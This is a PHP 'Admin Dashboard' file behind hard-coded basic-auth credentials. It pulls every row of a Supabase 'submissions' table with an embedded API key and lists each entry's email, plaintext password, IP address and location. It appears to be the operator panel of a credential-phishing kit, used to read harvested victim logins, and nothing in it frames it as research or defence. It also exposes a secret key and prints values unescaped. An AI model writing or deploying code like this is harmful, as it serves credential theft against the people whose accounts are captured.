<?php
$user = "ozone";
$pass = "Ozone@20";

if (!isset($_SERVER['PHP_AUTH_USER']) ||
    $_SERVER['PHP_AUTH_USER'] != $user ||
    $_SERVER['PHP_AUTH_PW'] != $pass) {

    header('WWW-Authenticate: Basic realm="Admin Area"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Access denied';
    exit;
}
?>


<?php

$url = "https://ptshthtnjcbngiceyjzc.supabase.co/rest/v1/submissions?select=*";

$ch = curl_init($url);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB0c2h0aHRuamNibmdpY2V5anpjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODIyNDc2NTYsImV4cCI6MjA5NzgyMzY1Nn0.sejLXlM95cllcRuFcG-18P9uVFTMSnL70svBZ1L0kag",
    "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB0c2h0aHRuamNibmdpY2V5anpjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODIyNDc2NTYsImV4cCI6MjA5NzgyMzY1Nn0.sejLXlM95cllcRuFcG-18P9uVFTMSnL70svBZ1L0kag",
    "Content-Type: application/json"
));

$response = curl_exec($ch);

if($response === false){
    die("CURL ERROR: " . curl_error($ch));
}

curl_close($ch);

$data = json_decode($response, true);

?>

<!DOCTYPE html>
<html>
<head>
    <title>Admin Dashboard</title>

     <style>
  body{
    background:white;
  }


table {
    width: 100%;
    border-collapse: collapse;
}

th, td {
    border: 1px solid #ddd;
    padding: 10px;
    text-align: left;
}

th {
    background: #007bff;
    color: white;
}
    </style>
    
</head>
<body>

<div style="width:90%; margin:auto; background:white; padding:20px;">

    <h2>Admin Dashboard</h2>

    <table>

        <tr>
            <th>ID</th>
            <th>Email</th>
            <th>Password</th>
            <th>IP Address</th>
            <th>Location</th>
            <th>Time</th>
        </tr>

        <?php 
            $count = 1;
            if(!empty($data)) { ?>
            <?php foreach($data as $row) { ?>

            <tr>
                <td><?php echo $count++; ?></td>
                <td><?php echo $row['email']; ?></td>
                <td><?php echo $row['password']; ?></td>
                <td><?php echo $row['ip_address']; ?></td>
                <td><?php echo $row['location']; ?></td>
                <td><?php echo $row['created_at']; ?></td>
            </tr>

            <?php } ?>
        <?php } else { ?>

            <tr>
                <td colspan="6">No data found</td>
            </tr>

        <?php } ?>

    </table>

</div>

</body>
</html>
